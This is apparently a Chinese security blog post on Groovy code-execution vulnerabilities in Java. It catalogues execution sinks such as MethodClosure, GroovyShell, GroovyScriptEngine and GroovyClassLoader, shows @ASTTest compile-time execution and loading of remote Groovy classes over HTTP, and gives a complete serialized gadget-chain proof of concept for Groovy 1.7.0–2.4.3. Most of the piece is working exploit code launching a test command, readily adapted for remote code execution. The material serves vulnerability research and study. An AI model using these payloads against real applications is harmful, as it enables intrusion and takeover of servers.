---
title: "Groovy漏洞"
onlyTitle: true
date: 2024-10-21 22:11:23
categories:
- java
- 框架漏洞
tags:
- Groovy
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg
---



Groovy 是一种基于 Java 平台的面向对象语言。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110024567.png)

pom.xml：

```java
		<dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>2.4.15</version>
        </dependency>
```

groovy也有自己的代码执行

`Runtime.getRuntime().exec("calc")`等价于`"calc".execute()`

## MethodClosure

call执行doCall

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110235628.png)

受保护方法doCall反射执行命令

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110247928.png)

```java
    public static void main(String[] args) throws Exception{
//        MethodClosure mc = new MethodClosure(Runtime.getRuntime(), "exec");
//        mc.call("calc");
        MethodClosure mc = new MethodClosure("calc","execute");
        mc.call();
    }
```



## GroovyShell

GroovyShell有两种执行命令的方式

* evaluate
* parse->run

evaluate存在多个重载，支持从GroovyCodeSource,String,File,URI,Reader执行代码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112621472.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112819508.png)

File,URI,和二次封装的GroovyCodeSource懒得写了

```java
    public static void main(String[] args) throws Exception
    {
        GroovyShell shell = new GroovyShell();
        String content = "'calc'.execute()";
//        shell.evaluate(content);//String evaluate
        shell.evaluate(new StringReader(content));//Reader evaluate
    }
```



## GroovyScriptEngine

GroovyScriptEngine支持从URL获取groovy脚本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181229802.png)

run方法如下，传入脚本名和执行脚本所带的参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181723299.png)

会先调用loadScriptByName从URL/String/Resource获取groovy脚本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180737550.png)

并执行脚本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180645476.png)

具体原理不用深究，看下用法：

Evil.groovy类：

```java
class Evil {
    Evil() {
        "calc".execute()
    }
}
```

比如指定系统ClassLoader去执行Evil.groovy类，无需编译，run时会自动编译

```java
public class groovyScriptEngine {
    public static void main(String[] args) throws Exception
    {
        GroovyScriptEngine gse = new GroovyScriptEngine(new URL[]{new URL("http://127.0.0.1:8888")},ClassLoader.getSystemClassLoader());
        gse.run("Evil.groovy","");
    }
}
```



## GroovyScriptEvaluator

GroovyScriptEvaluator.evaluate调用GroovyShell.evaluate

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183009000.png)

套娃，就是修改了接收参数为ScriptSource子类，用ResourceScriptSource才能接收URL

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183218869.png)

payload：

```java
ublic class groovyScriptEvaluator {
    public static void main(String[] args) throws Exception
    {
        UrlResource urlResource = new UrlResource(new URL("http://127.0.0.1:8888/Evil.groovy"));
        new GroovyScriptEvaluator().evaluate(new ResourceScriptSource(urlResource));
    }
}
```



## GroovyClassLoader

有loadClass和defineClass

GroovyClassLoader.parseClass支持从File，字符串加载groovy类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021190409940.png)

从代码上来看，parseClass是走了一个双亲委派的过程。definePackage 方法虽然没有显式调用父类加载器的方法，但在类加载过程中会遵循双亲委派机制

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021191507702.png)

```java
    public static void main(String[] args) throws Exception
    {
        GroovyClassLoader gcl = new GroovyClassLoader();
        Class clazz = gcl.parseClass("class Evil {\n" +
                "    static {\n" +
                "        \"calc\".execute()\n" +
                "    }\n" +
                "}");
        clazz.newInstance();
    }
```

可惜需要实例化，单纯defineClass并没有什么用

不过在Groovy中，只加载不初始化也是有办法RCE的

### AST注解

AST（Abstract Syntax Tree，抽象语法树）注解是 Groovy 提供的一种元编程工具，它允许你在编译时对代码进行修改或增强。这些注解在编译阶段被 Groovy 编译器识别并执行，因此可以在编译时对代码进行静态检查、代码生成或代码转换等操作。`@groovy.transform.ASTTest` 注解就是一个典型的例子，它在编译时执行指定的闭包，用于测试或验证代码的某些特性

AST注解的基本语法如下：

```groovy
@ASTTransformationClass(value="fully.qualified.name.of.TransformationClass")
```

其中，@ASTTransformationClass 是 Groovy 提供的一个元注解，用于指定一个实现了 org.codehaus.groovy.transform.ASTTransformation 接口的类。这个类在编译时会被调用，对标注了该注解的代码进行处理。

常见的AST注解：

@CompileStatic：启用静态类型检查，提高性能。
@Delegate：将方法委托给另一个对象。
@Canonical：自动生成构造函数、equals、hashCode 和 toString 方法。
@TupleConstructor：自动生成一个包含所有属性的构造函数。
@ASTTest：在编译时执行指定的闭包，用于测试或验证代码。

利用ASTTest可以在编译时就执行代码，从而RCE

比如，我指定下面的Evil.groovy

```groovy
@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("calc")})
class Person{}
```

POC：

```java
public class groovyClassLoader {
    public static void main(String[] args) throws Exception
    {
        GroovyClassLoader gcl = new GroovyClassLoader();
        Class clazz = gcl.parseClass("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"calc\")})\n" +
                "class Person{}");
    }
}
```



利用addClasspath+loadClass还可以手动加载http远程groovy类

addClasspath调用addURL->URLClassLoader.addURL把URL加入了ucp，熟悉的已经想到ucp是类加载的路径了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212518220.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212546569.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212608817.png)

loadClass会从ucp寻找该类



复现：

建一个恶意groovy类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212829041.png)

在该目录下开http服务，并用GroovyClassLoader加载

```java
public class groovyClassLoader_URL {
    public static void main(String[] args) throws Exception
    {
        GroovyClassLoader gcl = new GroovyClassLoader();
        gcl.addClasspath("http://127.0.0.1:8888/");
        gcl.loadClass("groovy_RuntimeEvil");
    }
}
```



## Groovy沙箱

maybe沙箱会限制evaluate call这些函数执行点

@AST和@Grab可能会绕过过滤，遇到了试一下吧，底层native的东西我也不会分析



## Groovy反序列化

**Groovy : 1.7.0-2.4.3**

改下依赖到漏洞版本，利用链

```java
AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
                MethodClosure.call()
                    ProcessGroovyMethods.execute()
```

ConvertedClosure.invokeCustom调用了call方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203132817.png)

进而触发任意方法执行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203219533.png)

加上ConvertedClosure继承了ConversionHandler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203330538.png)

这是个典型的动态代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203351155.png)

invoke方法里调用了invokeCustom

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203441854.png)

ConversionClosure随便代理一个类，由于call无参，只要类有无参方法即可。

最好是readObject有无参方法的，这样就能一步到位链起来。那就代理Map吧，然后用AnnotationInvocationHandler.readObject去调用Map.entrySet

注意这里AnnotationInvocationHandler并没有起到一个代理的作用

POC：

```java
public class ConversionHandler {
    public static void main(String[] args) throws Exception
    {
        MethodClosure mc = new MethodClosure("calc","execute");
        ConvertedClosure closure = new ConvertedClosure(mc);
        Object proxyConvertedClosure = Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},closure);//ConversionClosure代理Map
        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annoconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
        annoconstructor.setAccessible(true);
        Object annotationInvocationHandlerInstance = annoconstructor.newInstance(Target.class,null);
        Field memberValuesField = annotationInvocationHandler.getDeclaredField("memberValues");
        memberValuesField.setAccessible(true);
        memberValuesField.set(annotationInvocationHandlerInstance,proxyConvertedClosure);
        serialize(annotationInvocationHandlerInstance);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



挂个表

| 关键类                         | 关键函数   |
| ------------------------------ | ---------- |
| MethodClosure                  | call       |
| groovy.lang.GroovyShell        | evaluate   |
| groovy.util.GroovyScriptEngine | run        |
| GroovyScriptEvaluator          | evaluate   |
| groovy.lang.GroovyClassLoader  | parseClass |
| javax.script.ScriptEngine      | eval       |